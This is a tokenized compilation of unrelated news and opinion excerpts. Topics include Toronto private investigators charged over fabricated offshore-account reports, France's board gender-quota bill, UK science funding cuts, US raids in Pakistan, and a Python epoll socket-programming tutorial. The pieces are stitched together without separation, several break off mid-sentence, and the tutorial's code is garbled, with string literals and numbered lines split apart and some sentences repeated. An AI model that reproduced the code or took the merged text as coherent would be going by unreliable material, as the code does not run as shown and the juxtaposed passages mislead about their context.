Eventually ,
White promised to send it by mail in a plain envelope , wearing gloves so no one could track her fingerprints .
When it arrived – by fax actually – the signature was a forgery .
" I was so furious with myself , " Joice said .
" They took advantage of me and I would really like to see them stopped , so they can not do this to anyone else . "

In an interview with the Star , Wilbur said he was surprised when Joice 's lawyer told him he had secret accounts .
He knew they did not exist and said so .
The matter has been resolved – Joice said it was an embarrassing incident – and Wilbur said it points out how little control the province has over investigators .
" When ( private investigators ) are in a position of trust with the public , they should be able to be trusted , " Wilber said .
" When they prove that they can't be , the government should step in and stop them from practising . "
Johnson and White often meet clients together , but have different roles .
Johnson is the gumshoe , the licensed investigator White handles documents .
She gave up her private investigator licence in 2004 , the same year she incorporated World Solutions .
White tells clients not having a licence means she can do things – like bribe foreign bankers – licenced detectives can't do .
Type " private investigator Toronto " into a Google search and Johnson 's Internal Affairs is one of the first hits .
That 's how three of four lottery pals hired the private detectives in 2006 .
For many years , four employees of the Toronto Catholic District School Board pooled their money and played the same lottery numbers .
Lorraine Teicht , Robert Carlisi , and sisters - in - law Aurora and Silvana Pincivero were great friends .
In 2004 , Teicht took one of their 6/49 tickets to a small convenience store .
The clerk said sorry , no winner this time .
But they had won – $ 5.7 million – and the clerk palmed the ticket , closed his shop , then bought a $ 1 million mansion , a Tim Horton 's franchise for his son , and some new cars .
Six months later , one of the friends did a random check of their numbers on the Ontario Lottery and Gaming Corp. website and discovered the win .
Suspicious of Teicht , Aurora Pincivero eventually hired Internal Affairs .
With her two friends she paid $ 13,356 for a financial " sweep " .
The detectives reported picking up traces of the money , in accounts owned by Teicht from Toronto to Barbados and Switzerland .
When they confronted Teicht , she broke down , telling her friends where she had checked the ticket but insisting she did not steal the winnings and stash them offshore .
The group complained to the OLGC , who brought in the OPP .
Investigators arrested the shop owner on charges of fraud and theft and his trial is pending .
The OPP investigation uncovered the phony reports of offshore holdings and in 2007 passed the allegations on to the provincial agency that oversees private investigators , run by Jon Herberman .
The agency took no action , according to its own internal documents .
The lottery agency has doled out the winnings to the four lottery buddies , plus $ 788,000 interest .
With various parts of the case still before the courts , they declined to speak to the Star .
The group 's lawyer , Greg Harris , was himself referred to Cullen Johnson and Elaine White when he had concerns about a former bookkeeper his firm thought had stolen money .
For a fee of $ 28,832 , the private detective duo dug up information revealing the bookkeeper had secreted firm money in the Bahamas , Channel Islands , Hong Kong , Macao , Dubai and Switzerland .
When Harris retained a law firm in Hong Kong he learned that " the bank account information provided ... was non existent , " according to provincial government documents .
Harris did not return calls from the Star .
One man who has spent a great deal of time and money battling the investigators and trying to fix the system is Eric Cunningham , a former Liberal MPP from Hamilton ( 1975 to 1984 ) who went on to a career in public relations and then was vice - president of a large water services company .
Cunningham said it took a huge emotional and financial effort to prove in the courts that his ex-wife , Joan Montgomery , and detective Elaine White were wrong when they alleged he had $ 2.3 million offshore in accounts flung as far as the Cook Islands , Panama , the Bahamas , Hong Kong and the Cayman Islands .
" I was happy to be vindicated but this whole thing has beaten me down , had a huge and negative effect on my life , " said Cunningham , 60 , who has his small consulting business to pay the bills .
" What I would like to see is some serious oversight of private investigators by our government . "
His story began in 2005 with what should have been a simple divorce case .
The couple separated in 2002 after 22 years of marriage .
Allegations by Montgomery of hidden assets led to a 25 - day trial in 2007 , where reports by Elaine White and other detectives were presented .
Two Superior Court of Justice judges have ruled all of this as false .
One stated that the claims by Joan Montgomery and Elaine White were " fraudulent . "
Recently , almost five years after it started , Cunningham has been awarded legal costs in the matter , for the $ 313,000 it took to clear his name .
In the judge 's ruling he noted that Cunningham 's ex-wife ( her father funded much of this ) estimated she spent $ 1 million on lawyers and private detectives .
On Sept. 14 , 2009 , Elaine
White pleaded guilty under a provincial offences charge to one count of acting as a private investigator when she was not licenced , in connection with the Cunningham / Montgomery case .
She was fined $ 750 and put on probation for one year .
White and Johnson are to appear in court Dec. 18 in Toronto to face the criminal charges .
Together , they are charged with defrauding Aurora Pincivero ( lottery case ) and the law firm of Harris and Harris ( bookkeeper case ) .
Johnson is charged with defrauding a women in another divorce case .
White is charged with defrauding Karen Joice and Barry Kornhaber , and one other women ( all divorce cases ) .

Nicolas Sarkozy 's centre - right party has put forward legislation that would see women make up half the figures in France 's leading boardrooms by 2015 , under a bold plan to impose gender equality on the male - dominated business world .
In a bill submitted to the French parliament this week , all companies listed on the Paris stock exchange would have to ensure female employees made up 50 % of their board members by 2015 .
If passed , a gradual implementation of the law would see businesses obliged to have women in 20 % of board seats within 18 months , and 40 % within four years .
Jean - François Copé , president of the majority UMP party , said it could give a " much - needed electro - shock " to the French corporate world , long considered a bastion reserved for the male elite in which only 10.5 % of board members in CAC 40 ( French stock market index ) companies are female .
Referring to France 's move in 2000 to encourage gender equality in politics , he said : " We must do to companies what we did in the public domain a few years ago and impose parity . "
The proposals , which would also apply to state - owned companies and non-listed firms with supervisory boards , will be debated next month and would need the approval of both houses of parliament to become law .
Despite the historically entrenched opposition of business chiefs to quotas , advocates say the bill is the result of a sea change in public attitudes towards gender equality .
Over the past year a series of French figures not known for their feminist stance have spoken out in favour of quotas .
Daniel Lebègue , president of the conservative French Institute of directors ( IFA ) , said his organisation had reluctantly decided they were the only way of encouraging progress .
Nadine Morano , the secretary of state for the family , has said quotas are a " necessary evil " , while the president of Areva , Anne Lauvergeon , recently admitted she had changed her mind about a strategy she nonetheless acknowledged as " humiliating " .
Véronique Préaux - Cobti , a leading businesswoman , said the discussions were a sign that times had changed .
" In 2002 , a huge majority would have been against , " she told Le Figaro earlier this year .
" Now , after years of good will with no change , there is a real realisation that things are not going to change on their own . "
Cope and the bill 's other author , the UMP's Marie - Jo Zimmermann , are determined to capitalise on the change in public opinion to drive through the reforms .
Inspired by the example set in Norway , where enforced quotas have led to 40 % of director posts being occupied by women , they say they are willing to take on the " reserves " of several government ministers .
Their boss , President Sarkozy , was congratulated in 2007 for appointing seven women to his 15 - member cabinet .
However three of those , including former Justice Minister Rachida Dati , have since been replaced , giving rise to one news weekly wondering if he was starting to show his true " macho " colours .
France 's failure to impose parity on its politicians , despite a constitution change in 2000 which had the aim of giving women a larger presence in the French parliament , is one of the reasons many people remain sceptical about this week 's proposals .
At the last election , only 18 % of MPs in the lower house were women .
Françoise de Panafieu , one of those MPs , hit out today at her own party for setting out quotas for the business world when it had failed to put its own house in order .
" I prefer people setting an example to those giving lessons , " she told L'Express magazine , claiming that Sarkozy 's party had had to pay € 5 m ( £ 4.5 m ) in fines after the 2007 elections for failing to impose parity .
The Norway way
Norway was the pioneer in introducing legislation to boost the number of women on company boards , in 2003 .
The change in the law affected nearly 500 public companies , including 175 firms listed on the Oslo stock exchange .
Ministers stipulated that businesses should increase the number of women on their boards to 40 % or face the threat of closure .
It unleashed an uproar in the Norwegian business community , with many protesting it was ridiculous to shut down a company because it lacked a woman on the board .
Others argued that the law infringed the rights of shareholders to decide who they want as directors .
But the threat worked and company owners duly complied .
Norway now has the highest proportion of women on boards anywhere in the world with 44.2 % – up from 6 % in 2001 .
By comparison , in the UK , 12 % of FTSE 100 directors are female and one in four boards are exclusively male .
Sweden and Finland boast more women at leading companies at 22 % and 17 % respectively .
The proportion of female directors among US Fortune 500 firms is 15.2 % .

A 7000 player study of Everquest II published in the Journal of Communication reveals that female gamers are more dedicated to MMOs then their male counterparts .
Some conclusions drawn are as follows :
- Female gamers on average logged more hours per week than male players ( 29 hours vs. 25 hours ) - Female gamers underestimated their time spent playing more than male players .
Male respondents underreported their estimated time spent playing by about 1 hour / week , whereas female respondents underreported by about 3 hours .
- New media such as video games and MMOs must be taken into account in complex ways as researchers continue to refine gender role theory

Two days ago , conservative blogger Charles Johnson posted “ Why I Parted Ways With The Right ” — a concise explanation of why he “ wo n’t be going over the cliff ” with the American right - wing - nuts .
He names names , including a list of fascists , racists , bigots , white supremacists , homophobes , misogynists , anti-science luddites , anti-govermnent lunatics , conspiracy theorists , and promoters of violence and genocide who have escaped from the radical fringe loony bin and have largely become the mainstream right , including many of its leaders and major pundits .
What passes for dialog in the right wing has become “ universally dominated by raging hate speech ” .
Not surprisingly , the right - wing blogosphere responded to his post with more raging hate speech .
Then today , an even better - known conservative blogger , Andrew Sullivan , agreed in his post “ Leaving the Right ” that criticizes the “ rhetorical septic system ” of the “ conservative degeneracy in front of us ” .
Sullivan gives even more specific reasons why he left the right , saying he cannot support a movement that :
disregards the rule of law
uses the sacredness of religious faith for the pursuit of worldly power
is deeply homophobic , regarding gay people as a threat to their own families
believes any tactic can and should be used to fight political warfare , including lies and deliberate misinformation
sees permanent war as compatible with the goal of limited government
criminalizes private behavior in the war on drugs
does not accept evolution as fact
sees climate change as a hoax and offers domestic oil exploration as a core plank of an energy policy
embraces demagogues like Rush Limbaugh or nutjobs like Glenn Beck
sees violence as a primary tool for international relations and holds torture as a core value
These two stories struck a chord with me , and not because they were bashing the right .
This blog has sometimes been accused of being left - wing , but I do n’t feel like someone on the far left .
I agree strongly with many things that ( at least in the past ) were associated with the right : limited government , fiscal conservatism , gun rights , free markets , and capitalism .
On the other hand , I am a social liberal , like the libertarians ( who are also considered to be right - wing ) .
Above all I am a pragmatist , which makes me a moderate .
I supported ( and still support ) Obama because he is a moderate and a pragmatist .
I support single - payer health insurance because it just works so much better than what we have ( or what Congress is now proposing ) .
I am pro-choice not because I think abortion is ok ( it is n’t ) , but because it is none of the government ’s damn business .
The same thing goes for recreational drugs .
Interestingly , even though these might be considered left - wing positions , the majority ( or at least a plurality ) of Americans agree with me on these issues .
What struck a chord was that the big problems with the conservative movement are hatred and stupidity .
While I agree with many conservative principles , I abhor the intentional lies , hostility , and slavish devotion to power that now characterize the right .
So while I may attack the hypocrisy of the right in this blog , I do so not to destroy the right .
In fact , I fervently hope that the right can be saved .
But I do n’t think this can happen while people such as Sarah Palin , Rush Limbaugh , Glenn Beck , Karl Rove , Michele Bachmann , Ann Coulter , and Fox News represent modern conservative thought .
In fact , not only are they destroying the right , they just might destroy the rest of the country in the process .

CHEERS to hitting the mother lode .
Well , well , well .
Methinks the evildoers in the inner circle of the Bush administration are waking up this morning to a rude surprise :
[ Rrrring !! Rrrring ! ]
" Hello ? " " Turdblossom ! POTUS 43 here . "
" Good morning , Mr. President ! "
" Say , Karl , I got some bad news , I think .
They found the damning emails that you 'd hidden in the file labeled NOTHING TO SEE HERE , PLEASE IGNORE .
" Oh , Jesus .
Oh JESUS !!!
How many did they find ? "
" Um...one , two , three , four , five , ten , twenty , twenty - two ... "
" Oh , phew !
Thank God --- only twenty two . " " ... million . " [ Clunk ] " Karl ? Karl ? Hello ...? "
But before you start drooling all over your keyboard , Jonathan Turley reminds us that the emails wo n’t be made public until 2014 .
Memo to the National Archives : if you get any job applications for " email processing specialist " from " Hooter Scibby , " " Galberto Onzales " or " Rondoreezza Ice , " lock the place down and call the proper authorities !
JEERS to a late entry in the Understatement of the Decade contest : " A less than ideal bill . "
Yes , folks , the Senate healthcare reform bill --- once a promising and historic piece of legislation --- became stinky when Joe Lieberman publicly took a dump on it and forced Harry Reid and Barack Obama to laminate it and pledge their undying allegiance to it yesterday .
This is how the mighty Democratic majority fulfills its promise to the American people --- like clumsy fools :
Harry Reid and other leading Senate Democrats emerged from this evening 's special caucus meeting with little to say about what transpired in the closed door session and did n't take questions from reporters .
But as the Senate moves toward a vote on health care reform next week , it 's becoming apparent that even the most pro-reform senators are resigning themselves to a less - than - ideal bill and that the White House is keeping the pressure on to get a bill passed even if that means acceding to the demands of Joe Lieberman .
But it 's not over yet , kids !
Ben Nelson 's up next , and he wo n't budge until the bill applies only to blastocysts .
So ...
All I can say this morning is : buy stock in health insurance companies .
Buy Buy Buy Buy Buy .
Boom times ahead !

CHEERS to unions for same - sex yodelers .
Great --- now it 's fuckin ' Austria that 's kicking our butts .
Yeah , Austria !!!
While the U.S. grants nothing tangible to gay couples at the federal level , the country that spawned Der Fuhrer has approved civil unions ... admittedly with some strings :
Austrian civil unions are not equal to marriage , since CU 'd couples are n't allowed to adopt or use artificial insemination , and couples have to register in the coat closet rather than the regular registry office .
Still , this is a huge and excellent start .
We know that these prohibitions will fall away in time .
In other words , the Austrian parliament just sent the message : " You ’re here , you 're queer , and we 've started the process of getting used to it . "
Danke schon .
P.S. On December 15 , 1973 , the American Psychiatric Association declared that gay people are not " mentally ill . "
But they still officially maintain that being a Log Cabin Republican is " just weird . "

This 25 - year campaign has become an industry feeding on suffering .
I salute the individuals who have fought for 25 years to help the victims of the Bhopal gas disaster .
Their dedication has been exemplary .
They have fought energetically for compensation , medical treatment and justice .
The world has not forgotten its worst industrial disaster because these individuals have never tired of recalling the diabolical inferno of that night .
But while I recognise the immense suffering of victims and am prepared to accept that a new generation probably still suffers from ailments directly arising from having inhaled the gas as children , it is time to stop their activism .
It 's time for the Bhopal NGOs to draw a line under the tragedy and move on .
This is , of course , easy for someone like me to say .
I did not see a loved one die an excruciating death .
My lungs have not been damaged from inhaling the methyl isocyanate that leaked out of the Union Carbide pesticide factory , making breathing painful and earning a living impossible .
But victims cannot continue to be victims for 25 years .
To be a victim is to feel helpless and humiliated .
Instead of helping them to find closure and move on , the voluntary groups in Bhopal have kept picking at the scab .
Victimhood has been institutionalised .
Who is against jobs in the United States ?
The big banks , Wall Street , the Council on Foreign Relations , the Business Roundtable , the United States Chamber of Commerce , the National Retail Federation , Corporate America , the President of the United States , Congress of the United States .
Everyone is crying for jobs , but no one seems to understand why there are n't any .
And the reason for those opposing jobs is money .
Beginning in 1973 , big banks made most of their profit outside of the United States .
Industries off - shoring , investing , banks financing the investments , transfer fees , fees and interest on the loans made for bigger profits .
Long since , the big banks under the leadership of David Rockefeller have led the way to off - shore and make a bigger profit .
Goldman Sachs , AIG , Citicorp and Wall Street , conspiring for a bailout and now using it for bonuses , make more money from the off - shored operations .
The Council on Foreign Relations ought to be renamed the Council on Making Money .
A recent PEW poll reported fully 85 % of Americans said that protecting United States jobs should be a top foreign policy priority .
But only 21 % of the Council on Foreign Relations agrees .
Financial interests organized the Business Roundtable to continue off - shore investment and profit .
The local Chamber is for Main Street America , but Tom Donahue and the United States Chamber have sold out to the financial interests and oppose jobs and producing in the United States .
Thirty years ago , hundreds of thousands of Arrow shirts produced in China were a best seller in the United States .
But at Christmastime , the Chinese supply ran short and the retail stores had to order the same shirt from New Jersey .
They made 20 % less profit on the New Jersey shirt .
Retailers are all for profit from imports and against domestic production and jobs in America .
Corporate America would fight any initiative by the President , the Congress , or the government to create jobs in the United States .
That is , production that faces competition offshore .
In globalization , U. S. production can't make a profit , ca n't survive .
Its competition will off - shore the same article for a lesser price , putting you out of business .
Moreover , Corporate America does n't have to bother with labor in China .
The China government controls labor and you do n't have to worry about a work stoppage or minimum wage .
All they have is a maximum wage .
And Corporate America does n't have to worry with clean air and clean water or the environment in China .
Nor does it have to worry with OSHA and all of its safety rules .
Many times the factory building is furnished and you do n't have to worry with capital costs .
If you make a profit , you can just reinvest it in an additional operation and not have to pay any U. S. income tax .
If the operation fails , walk away with no legacy costs .
Corporate America bitterly opposes its government protecting and strengthening the U. S. economy because producing again in America will put the executives back to work .
They can send a Jaycee to China to watch the quality control daily and sit on the 32nd floor on Sixth Avenue with the internet , keeping check , and , leaving early for a massage and drinks .
With production in China they do n't have to work .
As Commander - in - Chief , the President dithered for months over the number of troops .
But he can't equip the troops except for the favor of a foreign country .
The War Production
Act of 1950 requires the President to make sure that we can produce in - country those articles necessary for our national defense .
Enforcing this law would limit the campaign contributions .
Under Section 201 of the trade laws , the President is supposed to take action , like impose tariffs or quotas , when a certain production is endangered .
Not only endangered , our automobile production has been bankrupted .
But all the President does is give Detroit bailout welfare .
The President does n't want to limit the campaign contributions .
The same with Congress .
Senator Byron Dorgan of North Dakota long ago tried to allocate the tax incentive for foreign jobs and production to domestic jobs and production .
The Business Roundtable and the U. S. Chamber fought it like a tiger and killed it .
As the President said in his West Point talk , there is fierce competition in international trade and globalization .
All countries move to protect and build their economies while the United States goes out of business .
The one advantage that the U.S. has is its richest market in the world .
It is fast becoming the poorest market and the U.S. is losing any clout to maintain a strong economy .
The economy is in the hands of Summers , Bernanke and Geithner .
Campaign contributions are in the hands of David Axelrod and Rahm Emanuel .
The poor President is smart , diligent and working his head off campaigning .
But he is inexperienced and not governing , and the Congress is in a Mexican standoff over an archaic filibuster rule that reveres democracy by the minority .
Of course , the media , which knows this and keeps it top secret , is owned by big business .
If I do n't meet you in the breadline , my children will .
Merry Christmas !

Lord Drayson said he would work with the STFC to find a better solution UK research could suffer , scientists say , in the wake of budget cuts announced by the Science and Technology Facilities Council ( STFC ) .
One of the UK 's largest funding councils will cut 25 % of its research studentships and fellowships .
Critics say this could harm the future of UK science , by reducing investment in the next generation of researchers .
The STFC has described the cuts to its funding programmes as " regrettable but necessary " .
The council has been forced to make savings following the global financial crisis and the fall in the value of the pound .
This has increased the cost of its subscriptions to large international facilities including the Large Hadron Collider at Cern in Switzerland , the European Synchrotron Radiation Facility ( ESRF ) and the European Space Agency ( Esa ) .
The Royal Astronomical Society pointed out that an increasingly squeezed funding budget meant that the council would withdraw from some existing research projects .
It said that , by 2012 , facilities including the UK Infrared Telescope in Hawaii , and the Gemini observatory would have " lost all UK support " .
" The result of this is the loss of all UK funding for ground - based optical observatories in the northern hemisphere , " said the society , " which will leave British scientists without direct access to a large part of the sky . "
But the STFC said that those withdrawls had been " on the cards for some time " .
FROM THE TODAY PROGRAMME
Please turn on JavaScript .

More from Today programme Julia Maddock , a spokesperson for the funding council , said : " When we signed up to the European Southern Observatory , we knew that we would have to pull back from some existing telescopes .
" This is a planned withdrawal that 's been continued . "
A better solution Nuclear physicist Professor Patrick Regan said that if the planned cuts went ahead , Britain could be left incapable of training the technicians it needs to develop the planned new next generation of nuclear power plants .
If the funding cuts go ahead , he told BBC News , it could mean the " destruction of nuclear physics as a research subject in the UK " .
The Science Minister , Lord Drayson , said that the cuts made it clear that there were " real tensions " in having international science projects , large scientific facilities and UK grant giving roles within a single research council .
Subscriptions to international facilities have become more expensive " It leads to grants being squeezed by increases in costs of the large international projects which are not solely within their control , " he said .
" I will work urgently with ... the STFC and the wider research community to find a better solution by the end of February 2010 . "
Nick Dusic , director of the pressure group Campaign for Science and Engineering ( Case ) , agreed that a review of the STFC 's structure was in order .
" The tensions Lord Drayson has identified are leading to the erosion of the research and skills base across a number of priority areas , " he said .
" Maintaining investment in the next generation of scientists and engineers is critical , " he added , " so the cut in studentships is a very worrying development . "

How To Use Linux epoll with Python
Contents
Introduction
As of version 2.6 , Python includes an API for accessing the Linux epoll library .
This article uses Python 3 examples to briefly demonstrate the API .
Blocking Socket Programming Examples
Example 1 is a simple Python server that listens on port 8080 for an HTTP request message , prints it to the console , and sends an HTTP response message back to the client .
Line 9 : Create the server socket .
Line 10 : Permits the bind ( ) in line 11 even if another program was recently listening on the same port .
Otherwise this program could not run until a minute or two after the previous program using that port had finished .
in line 11 even if another program was recently listening on the same port .
Otherwise this program could not run until a minute or two after the previous program using that port had finished .
Line 11 : Bind the server socket to port 8080 of all available IP v4 addresses on this machine .
Line 12 : Tell the server socket to start accepting incoming connections from clients .
Line 14 : The program will stop here until a connection is received .
When this happens , the server socket will create a new socket on this machine that is used to talk to the client .
This new socket is represented by the clientconnection object returned from the accept ( ) call .
The address object indicates the IP address and port number at the other end of the connection .
object returned from the call .
The object indicates the IP address and port number at the other end of the connection .
Lines 15 - 17 : Assemble the data being transmitted by the client until a complete HTTP request has been transmitted .
The HTTP protocol is described at HTTP Made Easy .
Line 18 : Print the request to the console , in order to verify correct operation .
Line 19 : Send the response to the client .
Lines 20 - 22 : Close the connection to the client as well as the listening server socket .
The official HOWTO has a more detailed description of socket programming with Python .
Example 1 ( All examples use Python 3 ) 1 import socket 2 3 EOL1 = b '
' 4 EOL2 = b '
\r
' 5 response = b ' HTTP /1.0 200 OK \r
Date : Mon , 1 Jan 1996 01:01:01 GMT
\r
' 6 response += b ' Content - Type : text / plain \r
Content - Length : 13 \r
\r
' 7 response += b ' Hello , world ! ' 8 9 serversocket = socket .
socket ( socket .
AF_INET , socket .
SOCK_STREAM ) 10 serversocket .
setsockopt ( socket .
SOL_SOCKET , socket .
SO_REUSEADDR , 1 ) 11 serversocket .
bind ( ( ' 0.0.0.0 ' , 8080 ) ) 12 serversocket .
listen ( 1 ) 13 14 connectiontoclient , address = serversocket .
accept ( ) 15 request = b '' 16 while EOL1 not in request and EOL2 not in request : 17 request += connectiontoclient .
recv ( 1024 ) 18 print ( request . decode ( ) ) 19 connectiontoclient .
send ( response ) 20 connectiontoclient .
close ( ) 21 22 serversocket . close ()
Example 2 adds a loop in line 15 to repeatedly processes client connections until interrupted by the user ( e.g. with a keyboard interrupt ) .
This illustrates more clearly that the server socket is never used to exchange data with the client .
Rather , it accepts a connection from a client , and then creates a new socket on the server machine that is used to communicate with the client .
The finally statement block in lines 23 - 24 ensures that the listening server socket is always closed , even if an exception occurs .
Example 2 1 import socket 2 3 EOL1 = b '
' 4 EOL2 = b '
\r
' 5 response = b ' HTTP /1.0 200 OK \r

accept ( ) 17 request = b '' 18 while EOL1 not in request and EOL2 not in request : 19 request += connectiontoclient .
recv ( 1024 ) 20 print ( '-' * 40 + '
' + request . decode ( ) [ : - 2 ] ) 21 connectiontoclient .
send ( response ) 22 connectiontoclient . close ( ) 23 finally : 24 serversocket . close ()
Benefits of Asynchronous Sockets and Linux epoll
The sockets shown in Example 2 are called blocking sockets , because the Python program stops running until an event occurs .
The accept ( ) call in line 16 blocks until a connection has been received from a client .
The recv( ) call in line 19 blocks until data has been received from the client ( or until there is no more data to receive ) .
The send ( ) call in line 21 blocks until all of the data being returned to the client has been queued by Linux in preparation for transmission .
When a program uses blocking sockets it often uses one thread ( or even a dedicated process ) to carry out the communication on each of those sockets .
The main program thread will contain the listening server socket which accepts incoming connections from clients .
It will accept these connections one at a time , passing the newly created socket off to a separate thread which will then interact with the client .
Because each of these threads only communicates with one client , any blockage does not prohibit other threads from carrying out their respective tasks .
The use of blocking sockets with multiple threads results in straightforward code , but comes with a number of drawbacks .
It can be difficult to ensure the threads cooperate appropriately when sharing resources .
And this style of programming can be less efficient on computers with only one CPU .
The C10K Problem discusses some of the alternatives for handling multiple concurrent sockets , such as the use of asynchronous sockets .
These sockets do n't block until some event occurs .
Instead , the program performs an action on an asynchronous socket and is immediately notified as to whether that action succeeded or failed .
This information allows the program to decide how to proceed .
Since asynchronous sockets are non-blocking , there is no need for multiple threads of execution .
All work may be done in a single thread .
This single - threaded approach comes with its own challenges , but can be a good choice for many programs .
It can also be combined with the multi- threaded approach : asynchronous sockets using a single thread can be used for the networking component of a server , and threads can be used to access other blocking resources , e.g. databases .
Linux has a number of mechanisms for managing asynchronous sockets , three of which are exposed by the Python select , poll and epoll API 's .
epoll and poll are better than select because the Python program does not have to inspect each socket for events of interest .
Instead it can rely on the operating system to tell it which sockets may have these events .
And epoll is better than poll because it does not require the operating system to inspect all sockets for events of interest each time it is queried by the Python program .
Rather Linux tracks these events as they occur , and returns a list when queried by Python .
These graphs show epoll 's advantage when using thousands of concurrent socket connections .
Asynchronous Socket Programming Examples with epoll
Programs using epoll often perform actions in this sequence :
Create an epoll object
Tell the epoll object to monitor specific events on specific sockets
Ask the epoll object which sockets may have had the specified event since the last query Perform some action on those sockets
Tell the epoll object to modify the list of sockets and / or events to monitor Repeat steps 3 through 5 until finished Destroy the epoll object
Example 3 duplicates the functionality of Example 2 while using asynchronous sockets .
The program is more complex because a single thread is interleaving the communication with multiple clients .
Line 1 : The select module contains the epoll functionality .
Line 13 : Since sockets are blocking by default , this is necessary to use non-blocking ( asynchronous ) mode .
Line 15 : Create an epoll object .
Line 16 : Register interest in read events on the server socket .
A read event will occur any time the server socket accepts a socket connection .
Line 19 : The connection dictionary maps file descriptors ( integers ) to their corresponding network connection objects .
Line 21 : Query the epoll object to find out if any events of interest may have occurred .
The parameter " 1 " signifies that we are willing to wait up to one second for such an event to occur .
If any events of interest occurred prior to this query , the query will return immediately with a list of those events .
Line 22 : Events are returned as a sequence of ( fileno , event code ) tuples .
fileno is a synonym for file descriptor and is always an integer .
Line 23 : If a read event occurred on the socket server , then a new socket connection may have been created .
Line 25 : Set new socket to non-blocking mode .
Line 26 : Register interest in read ( EPOLLIN ) events for the new socket .
Line 31 : If a read event occurred then read new data sent from the client .
Line 33 : Once the complete request has been received , then unregister interest in read events and register interest in write ( EPOLLOUT ) events .
Write events will occur when it is possible to send response data back to the client .
Line 34 : Print the complete request , demonstrating that although communication with clients is interleaved this data can be assembled and processed as a whole message .
Line 35 : If a write event occurred on a client socket , it 's able to accept new data to send to the client .
Lines 36 - 38 : Send the response data a bit at a time until the complete response has been delivered to the operating system for transmission .
Line 39 : Once the complete response has been sent , disable interest in further read or write events .
Line 40 : A socket shutdown is optional if a connection is closed explicitly .
This example program uses it in order to cause the client to shutdown first .
The shutdown call informs the client socket that no more data should be sent or received and will cause a well - behaved client to close the socket connection from it 's end .
Line 41 : The HUP ( hang - up ) event indicates that the client socket has been disconnected ( i.e. closed ) , so this end is closed as well .
There is no need to register interest in HUP events .
They are always indicated on sockets that are registered with the epoll object .
Line 42 : Unregister interest in this socket connection .
Line 43 : Close the socket connection .
Lines 18 - 45 :
The try - catch block is included because the example program will most likely be interrupted by a Keyboard Interrupt exception
Lines 46 - 48 : Open socket connections do n't need to be closed since Python will close them when the program terminates .
They 're included as a matter of good form .

epoll has two modes of operation , called edge - triggered and level - triggered .
In the edge - triggered mode of operation a call to epoll . poll ( ) will return an event on a socket only once after the read or write event occurred on that socket .
The calling program must process all of the data associated with that event without further notifications on subsequent calls to epoll.
poll ( ) .
When the data from a particular event is exhausted , additional attempts to operate on the socket will cause an exception .
Conversely , in the level - triggered mode of operation , repeated calls to epoll.poll( ) will result in repeated notifications of the event of interest , until all data associated with that event has been processed .
No exceptions normally occur in level - triggered mode .
For example , suppose a server socket has been registered with an epoll object for read events .
In edge - triggered mode the program would need to accept ( ) new socket connections until a socket . error exception occurs .
Whereas in the level - triggered mode of operation a single accept ( ) call can be made and then the epoll object can be queried again for new events on the server socket indicating that additional calls to accept ( ) should be made .
Example 3 used level - triggered mode , which is the default mode of operation .
Example 4 demonstrates how to use edge - triggered mode .
In Example 4 , lines 25 , 36 and 45 introduce loops that run until an exception occurs ( or all data is otherwise known to be handled ) .
Lines 32 , 38 and 48 catch the expected socket exceptions .
Finally , lines 16 , 28 , 41 and 51 add the EPOLLET mask which is used to set edge - triggered mode .

Since they 're similar , level - triggered mode is often used when porting an application that was using the select or poll mechanisms , while edge - triggered mode may be used when the programmer does n't need or want as much assistance from the operating system in managing event state .
In addition to these two modes of operation , sockets may also be registered with the epoll object using the EPOLLONESHOT event mask .
When this option is used , the registered event is only valid for one call to epoll .
poll( ) , after which time it is automatically removed from the list of registered sockets being monitored .
Performance Considerations
Listen Backlog Queue Size
In Examples 1 - 4 , line 12 has shown a call to the serversocket. listen ( ) method .
The parameter for this method is the listen backlog queue size .
It tells the operating system how many TCP / IP connections to accept and place on the backlog queue before they are accepted by the Python program .
Each time the Python program calls accept ( ) on the server socket , one of the connections is removed from the queue and that slot can be used for another incoming connection .
If the queue is full , new incoming connections are silently ignored causing unnecessary delays on the client side of the network connection .
A production server usually handles tens or hundreds of simultaneous connections , so a value of 1 will usually be inadequate .
For example , when using ab to perform load testing against these sample programs with 100 concurrent HTTP 1.0 clients , any backlog value less than 50 would often produce performance degradation .
TCP Options
The TCP_CORK option can be used to " bottle up " messages until they are ready to send .
This option , illustrated in lines 34 and 40 of Example 5 , might be a good option to use for an HTTP server using HTTP / 1.1 pipelining .
Example 5 1 import socket , select 2 3 EOL1 = b '
' 4 EOL2 = b '

On the other hand , the TCP_NODELAY option can be used to tell the operating system that any data passed to socket. send ( ) should immediately be sent to the client without being buffered by the operating system .
This option , illustrated in line 14 of Example 6 , might be a good option to use for an SSH client or other " real - time " application .

A Hayward man was shot and killed in front of his 13 - year - old daughter while walking the family 's dogs Tuesday evening , the result of a dispute with another man who took exception to one of the dogs sniffing at his leg , police said Wednesday .
Thomas Cunningham , 38 , was shot outside a liquor store around 10 p.m. near Vermont and B streets shortly after he'd gone inside to buy ice cream for his daughter .

The legs on this thing almost feel like a cruel joke .

Without the ability to pee ?
And without the dignity you sacrificed in becoming a six - foot - tall human frog fetus , minus prospects for a happier future ?

That US forces regularly use unmanned drones to attack terrorist targets in Pakistan is nothing new , but a report at the Guardian suggests that US special forces repeatedly put “ boots on the ground ” inside the country as part of the war against insurgents .
Citing a “ former NATO officer ” with “ detailed knowledge of the operations , ” the Guardian reported late Monday evening that the US launched “ multiple clandestine raids ” into Pakistan between 2003 and 2008 , and that the Pakistani government was not informed of the raids .

The unnamed NATO source details four separate incidents in which US troops landed on Pakistani soil , including the only previously reported raid : A September , 2008 , operation which targeted three houses inside Pakistan , near the Afghanistan border , which reportedly killed 15 people .
Of the other three operations , two were attacks on suspected militants ( one of which failed ) , and the third was a rescue operation to retrieve a Predator drone .
The fact the US military would send in a clandestine force to extract the drone , rather than ask the Pakistani military for help , shows how uneasy the alliance between the US and Pakistan is , the Guardian reports .
Such operations are a matter of sensitivity in Pakistan .
While public opinion has grudgingly tolerated CIA - led drone strikes in the tribal areas , any hint of American “ boots on the ground ” is greeted with virulent condemnation .
In recent months , news has been coming out about the extent of the US ’s military involvement in Pakistan .
Last month ,
The Nation reported that the Obama administration is using the controversial security contractor Blackwater to kidnap or kill “ high - value targets ” in Pakistan .
Erik Prince , the CEO and founder of the security firm , appeared to confirm his own deep involvement in the CIA ’s role in the war on terrorism , telling Vanity Fair that he had been recruited as a CIA “ asset . ”

Physically Fit , Visibly Drunk A Guide to Being Healthy and Wasted in the New Year !
Illustration by Dave Neeson
Psychologists love to tell us that New Year 's resolutions will usually fail .
Bull - to - the - shit !
These " learned men " have failed to note the obvious :
